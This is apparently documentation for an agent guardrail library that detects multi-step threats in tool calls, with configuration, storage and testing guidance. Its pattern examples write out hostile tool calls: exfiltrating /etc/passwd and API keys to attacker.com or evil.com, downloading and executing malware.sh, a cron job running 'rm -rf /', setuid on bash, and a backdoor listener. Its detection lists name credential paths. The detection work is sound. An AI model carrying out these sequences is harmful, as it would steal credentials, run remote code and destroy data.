# Behavioral Threat Patterns

Comprehensive guide to cross-message threat detection using behavioral analysis.

## Overview

Behavioral analysis detects sophisticated attacks that span multiple messages or tool calls. Unlike content guards that analyze individual messages, behavioral patterns look for suspicious sequences of actions over time.

**Key Concept:** An attacker might not trigger any single content guard, but their sequence of actions reveals malicious intent.

## How It Works

### 1. Session Tracking

Every tool call or action is recorded with:
- **Session ID** - Groups related actions
- **Timestamp** - When the action occurred
- **Tool** - What function was called
- **Arguments** - Parameters passed to the function

### 2. Pattern Matching

The system continuously analyzes recent events looking for matches against known threat patterns. Each pattern defines:
- **Sequence of steps** - What actions occur in what order
- **Time windows** - How quickly steps must follow each other
- **Argument patterns** - What parameters indicate suspicious intent

### 3. Threat Detection

When a pattern is matched:
- The sequence is flagged as a threat
- Severity level is assigned (low, medium, high, critical)
- Evidence (matching events) is provided
- The action can be blocked or logged

## Built-in Threat Patterns

### 🔴 Critical Severity

#### 1. File Exfiltration

**Pattern:** Read sensitive file → HTTP POST

**Description:** Attacker reads a sensitive file and immediately sends it to an external server.

**Example sequence:**
```typescript
1. read_file({ path: '/etc/passwd' })
2. http_post({ url: 'https://attacker.com/exfil', data: '...' })
```

**Detection criteria:**
- Step 1: Read file with path matching `/etc/`, `/home/`, `/secret/`, `.env`, `.ssh`, `.aws`
- Step 2: HTTP request within 30 seconds

**Why it's critical:** Direct data theft in progress.

---

#### 2. Credential Theft

**Pattern:** Access credentials → External write

**Description:** Reading API keys, passwords, or tokens followed by external communication.

**Example sequence:**
```typescript
1. read_env({ key: 'API_KEY' })
2. http_post({ url: 'https://evil.com/steal' })
```

**Detection criteria:**
- Step 1: Read operation on keys/tokens/passwords/secrets/credentials
- Step 2: Write or HTTP operation within 60 seconds

**Why it's critical:** Credential compromise leads to account takeover.

---

#### 3. Data Exfiltration via Code

**Pattern:** Read files → Execute code → Network request

**Description:** Multi-step attack where code is executed to package and send data.

**Example sequence:**
```typescript
1. read_file({ path: '/data/users.db' })
2. exec({ command: 'python exfil.py' })
3. http_post({ url: 'https://attacker.com' })
```

**Detection criteria:**
- Step 1: File read
- Step 2: Code execution (exec/eval/python/node) within 30s
- Step 3: Network request within 30s

**Why it's critical:** Sophisticated multi-stage attack.

---

#### 4. Suspicious Shell Commands

**Pattern:** Web fetch → Shell execution

**Description:** Download malicious code and execute it.

**Example sequence:**
```typescript
1. http_get({ url: 'https://evil.com/malware.sh' })
2. bash({ command: 'sh /tmp/malware.sh' })
```

**Detection criteria:**
- Step 1: HTTP fetch/download/curl/wget
- Step 2: Shell execution within 15 seconds

**Why it's critical:** Remote code execution attack.

---

#### 5. Backdoor Creation

**Pattern:** Create executable → Set permissions → Network access

**Description:** Installing persistent backdoor with network capability.

**Example sequence:**
```typescript
1. write_file({ path: '/tmp/backdoor.sh', content: '...' })
2. chmod({ path: '/tmp/backdoor.sh', mode: '+x' })
3. http_listen({ port: 4444 })
```

**Detection criteria:**
- Step 1: Write file with executable extension (.sh, .py, .js, .exe)
- Step 2: Permission modification within 30s
- Step 3: Network operation (listen/connect/fetch) within 60s

**Why it's critical:** Persistent access mechanism.

---

#### 6. Log Tampering

**Pattern:** Modify or delete audit logs

**Description:** Covering tracks by destroying evidence.

**Example sequence:**
```typescript
1. write_file({ path: '/var/log/audit.log', content: '' })
// or
1. delete_file({ path: '/var/log/auth.log' })
```

**Detection criteria:**
- Single step: Write/delete/truncate on files matching `log`, `audit`, `history`, `.bash_history`

**Why it's critical:** Indicates attempt to hide malicious activity.

---

### 🟠 High Severity

#### 7. Escalation Attempts

**Pattern:** Multiple permission denials

**Description:** Repeatedly trying privileged operations suggests privilege escalation attempt.

**Example sequence:**
```typescript
1. sudo_exec({ command: 'whoami' })  // denied
2. sudo_exec({ command: 'su root' }) // denied
3. sudo_exec({ command: 'chmod +s /bin/bash' }) // denied
4. sudo_exec({ command: 'passwd' })  // denied
```

**Detection criteria:**
- Minimum 3 occurrences within 5 minutes
- Tools matching: sudo, chmod, chown, admin, root, privilege

**Why it's high:** Not successful yet, but clear malicious intent.

---

#### 8. Secret Scanning

**Pattern:** Read .env or secrets → Any external action

**Description:** Accessing configuration files with secrets.

**Example sequence:**
```typescript
1. read_file({ path: '.env' })
2. write_file({ path: '/tmp/data.txt' })
```

**Detection criteria:**
- Step 1: Read `.env`, `secret`, `credentials`, `config.json`
- Step 2: Write, HTTP, or exec within 30s

**Why it's high:** Access to secrets is precursor to theft.

---

#### 9. Time Bomb

**Pattern:** Schedule delayed action → Execute code

**Description:** Setting up future malicious activity.

**Example sequence:**
```typescript
1. cron({ schedule: '0 3 * * *', command: 'rm -rf /' })
2. exec({ command: 'at now + 1 hour -f malicious.sh' })
```

**Detection criteria:**
- Step 1: Scheduling operation (cron, at, schedule, timeout, delay)
- Step 2: Code execution within 30s

**Why it's high:** Delayed attack harder to trace.

---

#### 10. Resource Exhaustion

**Pattern:** Excessive tool calls

**Description:** Denial of service through resource consumption.

**Example:**
```typescript
// 50+ tool calls in 1 minute
for (let i = 0; i < 100; i++) {
  api_call({ ... });
}
```

**Detection criteria:**
- Minimum 50 tool calls within 60 seconds
- Any tool type

**Why it's high:** DoS attack in progress.

---

#### 11. Lateral Movement

**Pattern:** Multiple system connections

**Description:** Moving between systems to expand access.

**Example sequence:**
```typescript
1. ssh({ host: 'server1.internal' })
2. ssh({ host: 'server2.internal' })
3. ssh({ host: 'server3.internal' })
```

**Detection criteria:**
- Minimum 3 occurrences within 5 minutes
- Tools: ssh, connect, remote, network

**Why it's high:** Spreading to additional systems.

---

### 🟡 Medium Severity

#### 12. Mass Data Access

**Pattern:** Reading many files quickly

**Description:** Bulk data collection, possibly automated.

**Example:**
```typescript
for (let i = 0; i < 15; i++) {
  read_file({ path: `/data/file${i}.txt` });
}
```

**Detection criteria:**
- Minimum 10 file reads within 60 seconds

**Why it's medium:** May be legitimate bulk operation or reconnaissance.

---

#### 13. Unusual Tool Sequence

**Pattern:** Write → Read → Execute

**Description:** Creating then immediately running a file (possibly dropper).

**Example sequence:**
```typescript
1. write_file({ path: '/tmp/script.py' })
2. read_file({ path: '/tmp/script.py' })
3. python({ script: '/tmp/script.py' })
```

**Detection criteria:**
- Write → Read (within 5s) → Exec (within 5s)
- Same or related file path

**Why it's medium:** Could be development workflow or attack.

---

#### 14. Permission Probing

**Pattern:** Rapidly testing multiple tools

**Description:** Discovering what tools/APIs are available.

**Example:**
```typescript
1. list_files()
2. read_file()
3. write_file()
4. exec()
5. http_post()
// Trying everything quickly
```

**Detection criteria:**
- Minimum 5 different tool calls within 30 seconds

**Why it's medium:** Reconnaissance phase of attack.

---

#### 15. Data Poisoning

**Pattern:** Read → Modify → Write → Read

**Description:** Tampering with data and verifying changes.

**Example sequence:**
```typescript
1. read_file({ path: '/config/settings.json' })
2. write_file({ path: '/config/settings.json', content: 'modified' })
3. read_file({ path: '/config/settings.json' }) // verify
```

**Detection criteria:**
- Read → Write (within 30s) → Read (within 30s)
- Same file or similar path

**Why it's medium:** Data integrity compromise.

---

## Configuration

### Using Built-in Patterns

```typescript
import { BehavioralGuard, BUILTIN_PATTERNS } from '@openclaw-guardrails/core';

const guard = new BehavioralGuard({
  storage: 'memory',
  patterns: BUILTIN_PATTERNS, // All 15 patterns
  sessionTTL: 3600000, // 1 hour
});
```

### Selecting Specific Patterns

```typescript
import {
  BehavioralGuard,
  FILE_EXFILTRATION,
  CREDENTIAL_THEFT,
  ESCALATION_ATTEMPTS,
} from '@openclaw-guardrails/core';

const guard = new BehavioralGuard({
  patterns: [
    FILE_EXFILTRATION,
    CREDENTIAL_THEFT,
    ESCALATION_ATTEMPTS,
  ],
});
```

### Custom Patterns

Create your own threat patterns:

```typescript
import type { ThreatPattern } from '@openclaw-guardrails/core';

const customPattern: ThreatPattern = {
  name: 'database-export-attack',
  description: 'Exporting database then sending externally',
  severity: 'critical',
  maxTimeWindow: 120000, // 2 minutes
  steps: [
    {
      tool: /database_(query|export|dump)/,
      args: { table: /users|customers|payments/ },
    },
    {
      tool: /http_(post|put)|email_send/,
      timeWindow: 60000, // Within 1 minute
    },
  ],
};

const guard = new BehavioralGuard({
  patterns: [customPattern],
});
```

## Storage Options

### In-Memory (Default)

Fast, zero-config, perfect for single-instance:

```typescript
const guard = new BehavioralGuard({
  storage: 'memory',
  sessionTTL: 3600000,
});
```

**Pros:**
- Zero setup
- Fastest performance
- No external dependencies

**Cons:**
- Lost on restart
- Not suitable for multi-instance deployments

### SQLite (Optional)

Persistent storage, single-file:

```typescript
// Install: npm install better-sqlite3

const guard = new BehavioralGuard({
  storage: 'sqlite',
  storageConfig: {
    path: './sessions.db',
  },
});
```

**Pros:**
- Persists across restarts
- Single file, easy backup
- No server needed

**Cons:**
- Slightly slower than memory
- Single-instance only

### Redis (Optional)

Distributed, shared across instances:

```typescript
// Install: npm install ioredis

const guard = new BehavioralGuard({
  storage: 'redis',
  storageConfig: {
    host: 'localhost',
    port: 6379,
  },
});
```

**Pros:**
- Shared across multiple instances
- Fast, distributed
- Automatic TTL support

**Cons:**
- Requires Redis server
- Network latency

## Performance

### Pattern Matching Performance

- **Typical session (50 events):** <1ms
- **Large session (500 events):** <5ms
- **Memory usage:** ~1KB per session

### Optimization Tips

1. **Set appropriate TTL:**
   ```typescript
   sessionTTL: 3600000, // 1 hour - balance security vs memory
   ```

2. **Use only needed patterns:**
   ```typescript
   // Don't load all 15 patterns if you only need a few
   patterns: [FILE_EXFILTRATION, CREDENTIAL_THEFT],
   ```

3. **Regular cleanup:**
   ```typescript
   // Automatic with MemoryStore
   // Manual if using custom store
   await store.cleanup(Date.now() - sessionTTL);
   ```

## Monitoring

### Logging Threats

```typescript
const guard = new BehavioralGuard({ ... });

// Check returns detailed threat info
const result = await guard.check(toolEvent);

if (result.blocked) {
  console.error('Threat detected:', {
    pattern: result.metadata.threats[0].pattern,
    severity: result.metadata.threats[0].severity,
    evidence: result.metadata.threats[0].evidence,
    session: toolEvent.sessionId,
  });

  // Send to monitoring system
  monitoring.alert({
    type: 'behavioral-threat',
    severity: result.metadata.threats[0].severity,
    pattern: result.metadata.threats[0].pattern,
  });
}
```

### Metrics to Track

1. **Threat detections per hour**
2. **Most common patterns triggered**
3. **Sessions flagged** as percentage of total
4. **False positive rate**
5. **Pattern matching latency**

## Best Practices

### 1. Start with High-Severity Patterns

Begin with critical patterns (file exfiltration, credential theft) before adding medium-severity ones:

```typescript
const guard = new BehavioralGuard({
  patterns: [
    FILE_EXFILTRATION,
    CREDENTIAL_THEFT,
    BACKDOOR_CREATION,
    LOG_TAMPERING,
  ],
});
```

### 2. Tune Time Windows

Adjust based on your application's typical behavior:

```typescript
// If your app normally takes 5 minutes between operations:
const relaxedPattern: ThreatPattern = {
  ...FILE_EXFILTRATION,
  maxTimeWindow: 300000, // 5 minutes instead of 1
};
```

### 3. Handle False Positives

Log and review flagged sequences:

```typescript
if (result.blocked) {
  // Log for manual review
  logger.warn('Potential false positive', {
    pattern: result.metadata.threats[0].pattern,
    evidence: result.metadata.threats[0].evidence,
  });

  // Allow but monitor if confidence is borderline
  if (result.confidence < 0.8) {
    // Allow through but increase monitoring
  }
}
```

### 4. Session Management

Clean up old sessions regularly:

```typescript
// With MemoryStore (automatic):
const guard = new BehavioralGuard({
  sessionTTL: 3600000, // Auto-cleanup after 1 hour
});

// Manual cleanup if needed:
setInterval(async () => {
  await store.cleanup(Date.now() - 3600000);
}, 300000); // Every 5 minutes
```

## Testing

### Unit Testing Patterns

```typescript
import { describe, it, expect } from 'vitest';
import { BehavioralGuard, FILE_EXFILTRATION } from '@openclaw-guardrails/core';

describe('Behavioral Detection', () => {
  const guard = new BehavioralGuard({
    patterns: [FILE_EXFILTRATION],
  });

  it('detects file exfiltration', async () => {
    // Step 1: Read sensitive file
    await guard.check({
      sessionId: 'test',
      timestamp: Date.now(),
      tool: 'read_file',
      args: { path: '/etc/passwd' },
    });

    // Step 2: HTTP POST (should trigger pattern)
    const result = await guard.check({
      sessionId: 'test',
      timestamp: Date.now(),
      tool: 'http_post',
      args: { url: 'https://evil.com' },
    });

    expect(result.blocked).toBe(true);
    expect(result.metadata.threats[0].pattern).toBe('file-exfiltration');
  });
});
```

## Troubleshooting

### Pattern Not Triggering

1. Check session ID - events must have same sessionId
2. Verify time windows - check timestamps
3. Review argument patterns - regex must match
4. Check minOccurrences - ensure enough events

### Too Many False Positives

1. Increase time window thresholds
2. Make argument patterns more specific
3. Increase minOccurrences for frequency-based patterns
4. Add exclusions for known-safe operations

### Performance Issues

1. Reduce sessionTTL
2. Use fewer patterns
3. Implement cleanup more frequently
4. Consider switching to Redis for distributed setup

---

For complete examples, see `/examples/02-behavioral-analysis.ts`.
